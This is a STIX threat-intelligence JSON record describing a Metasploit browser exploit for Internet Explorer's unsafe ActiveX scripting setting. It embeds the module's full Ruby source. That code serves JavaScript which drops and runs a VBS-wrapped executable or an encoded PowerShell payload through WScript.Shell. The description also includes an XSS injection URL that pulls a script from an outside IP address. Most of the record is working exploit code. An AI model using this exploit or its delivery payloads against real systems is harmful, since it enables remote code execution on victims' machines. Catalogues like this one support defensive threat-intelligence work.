{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6798a7f6-fbdd-4261-b0de-02104ed36879",
    "created": "2024-08-14T16:40:49.471452Z",
    "modified": "2024-08-14T16:40:49.471457Z",
    "name": "Microsoft Internet Explorer Unsafe Scripting Misconfiguration",
    "description": " This exploit takes advantage of the \"Initialize and script ActiveX controls not marked safe for scripting\" setting within Internet Explorer.  When this option is set IE allows access to the WScript.Shell ActiveX control, which allows javascript to interact with the file system and run commands.  This security flaw is not uncommon in corporate environments for the 'Intranet' or 'Trusted Site' zones.  When set via domain policy, the most common registry entry to modify is HKLM\\ Software\\Policies\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\1\\1201 which if set to '0' forces ActiveX controls not marked safe for scripting to be enabled for the Intranet zone.  This module creates a javascript/html hybrid that will render correctly either via a direct GET http://msf-server/ or as a javascript include, such as in: http://intranet-server/xss.asp?id=\"><script%20src=http://10.10.10.10/ie_unsafe_script.js> </script>.  IE Tabs, WScript and subsequent Powershell prompts all run as x86 even when run from an x64 iexplore.exe.  By default, this module will not attempt to fire against IEs that come with Protected Mode enabled by default, because it can trigger a security prompt. However, if you are feeling brave, you can choose to ignore this restriction by setting the ALLOWPROMPT datastore option to true.   'License'               => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ie_unsafe_scripting.rb",
            "external_id": "ie_unsafe_scripting.rb"
        },
        {
            "source_name": "reference",
            "url": "http://support.microsoft.com/kb/182569"
        },
        {
            "source_name": "reference",
            "url": "http://blog.invisibledenizen.org/2009/01/ieunsafescripting-metasploit-module.html"
        },
        {
            "source_name": "reference",
            "url": "http://support.microsoft.com/kb/870669"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::BrowserExploitServer\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Powershell\n\n  VULN_CHECK_JS = %Q|\n    try {\n      new ActiveXObject(\"WScript.Shell\");\n      new ActiveXObject(\"Scripting.FileSystemObject\");\n      is_vuln = true;\n    } catch(e) {}\n  |\n\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'                  => 'Microsoft Internet Explorer Unsafe Scripting Misconfiguration',\n      'Description'           => %q{\n        This exploit takes advantage of the \"Initialize and script ActiveX controls not\n      marked safe for scripting\" setting within Internet Explorer.  When this option is set,\n      IE allows access to the WScript.Shell ActiveX control, which allows javascript to\n      interact with the file system and run commands.  This security flaw is not uncommon\n      in corporate environments for the 'Intranet' or 'Trusted Site' zones.\n\n        When set via domain policy, the most common registry entry to modify is HKLM\\\n      Software\\Policies\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\1\\1201,\n      which if set to '0' forces ActiveX controls not marked safe for scripting to be\n      enabled for the Intranet zone.\n\n        This module creates a javascript/html hybrid that will render correctly either\n      via a direct GET http://msf-server/ or as a javascript include, such as in:\n      http://intranet-server/xss.asp?id=\"><script%20src=http://10.10.10.10/ie_unsafe_script.js>\n      </script>.\n\n        IE Tabs, WScript and subsequent Powershell prompts all run as x86 even when run from\n      an x64 iexplore.exe.\n\n        By default, this module will not attempt to fire against IEs that come with Protected\n      Mode enabled by default, because it can trigger a security prompt. However, if you are\n      feeling brave, you can choose to ignore this restriction by setting the ALLOWPROMPT\n      datastore option to true.\n      },\n\n      'License'               => MSF_LICENSE,\n      'Author'                =>\n        [\n          'natron',\n          'Ben Campbell' # PSH and remove ADODB.Stream\n        ],\n        'References'          =>\n        [\n          [ 'URL', 'http://support.microsoft.com/kb/182569' ],\n          [ 'URL', 'http://blog.invisibledenizen.org/2009/01/ieunsafescripting-metasploit-module.html' ],\n          [ 'URL', 'http://support.microsoft.com/kb/870669']\n        ],\n        'DisclosureDate'      => '2010-09-20',\n        'Platform'            => 'win',\n        'BrowserRequirements' => {\n          source:          'script',\n          os_name:         OperatingSystems::Match::WINDOWS,\n          ua_name:         HttpClients::IE,\n          vuln_test:       VULN_CHECK_JS,\n          vuln_test_error: 'WScript.Shell or Scripting.FileSystemObject not allowed by browser.'\n        },\n        'Arch'                => ARCH_X86,\n        'Targets'             =>\n          [\n            [ 'Windows x86/x64', {} ]\n          ],\n        'DefaultOptions'      =>\n          {\n            'HTTP::compression' => 'gzip'\n          },\n        'DefaultTarget'  => 0\n      ))\n\n    register_options(\n        [\n           OptBool.new('ALLOWPROMPT', [true, 'Allow exploit to ignore the protected mode prompt', false]),\n           OptEnum.new('TECHNIQUE', [true, 'Delivery technique (VBS Exe Drop or PSH CMD)', 'VBS', ['VBS','Powershell']])\n        ], self.class\n    )\n  end\n\n  # Unfortunately we don't currently have an explicit way to check whether Protected Mode is\n  # actually enabled or not, so we can only rely on whatever is default on the OS. This should\n  # allow BAP2 to always fire without worrying about the prmopt popping up, but the user can\n  # still ignore this by setting ALLOWPROMPT to true in standalone mode.\n  def has_protected_mode_prompt?(browser)\n    if datastore['ALLOWPROMPT']\n      return false\n    elsif OperatingSystems::Match::WINDOWS_XP === browser[:os_name]\n      return false\n    end\n\n    true\n  end\n\n  def on_request_exploit(cli, request, browser)\n    if has_protected_mode_prompt?(browser)\n      print_warning(\"This target possibly has Protected Mode, exploit aborted.\")\n      send_not_found(cli)\n      return\n    end\n\n    # Build out the HTML response page\n    var_shellobj = rand_text_alpha(rand(5)+5)\n\n    p = regenerate_payload(cli)\n    if datastore['TECHNIQUE'] == 'VBS'\n      js_content = vbs_technique(var_shellobj, p)\n    else\n      js_content = psh_technique(var_shellobj, p)\n    end\n\n    print_status(\"Request received for #{request.uri}\")\n    print_status(\"Sending exploit html/javascript\");\n\n    # Transmit the response to the client\n    send_response(cli, js_content, { 'Content-Type' => 'text/html' })\n\n    # Handle the payload\n    handler(cli)\n  end\n\n  def vbs_technique(var_shellobj, p)\n    var_fsobj       = rand_text_alpha(rand(5)+5)\n    var_fsobj_file  = rand_text_alpha(rand(5)+5)\n    var_vbsname     = rand_text_alpha(rand(5)+5)\n    var_writedir    = rand_text_alpha(rand(5)+5)\n\n    exe = generate_payload_exe({ :code => p.encoded })\n    vbs = Msf::Util::EXE.to_exe_vbs(exe)\n    vbs_content =  Rex::Text.to_hex(vbs)\n\n    # Build the javascript that will be served\n    js_content  = %Q|\n<html><head></head><body><script>\nvar #{var_shellobj} = new ActiveXObject(\"WScript.Shell\");\nvar #{var_fsobj}    = new ActiveXObject(\"Scripting.FileSystemObject\");\nvar #{var_writedir} = #{var_shellobj}.ExpandEnvironmentStrings(\"%TEMP%\");\nvar #{var_fsobj_file} = #{var_fsobj}.OpenTextFile(#{var_writedir} + \"\\\\\\\\\" + \"#{var_vbsname}.vbs\",2,true);\n\n#{var_fsobj_file}.Write(unescape(\"#{vbs_content}\"));\n#{var_fsobj_file}.Close();\n\n#{var_shellobj}.run(\"wscript.exe \" + #{var_writedir} + \"\\\\\\\\\" + \"#{var_vbsname}.vbs\", 1, true);\n#{var_fsobj}.DeleteFile(#{var_writedir} + \"\\\\\\\\\" + \"#{var_vbsname}.vbs\");\n</script></html>\n|\n    js_content\n  end\n\n  def psh_technique(var_shellobj, p)\n    cmd = Rex::Text.to_hex(cmd_psh_payload(payload.encoded, payload_instance.arch.first))\n    js_content = %Q|\n<html><head></head><body><script>\nvar #{var_shellobj} = new ActiveXObject(\"WScript.Shell\");\n#{var_shellobj}.run(unescape(\"#{cmd}\"), 1, true);\n</script></html>\n|\n\n    js_content\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-09-20",
    "x_mitre_platforms": [
        "win'"
    ]
}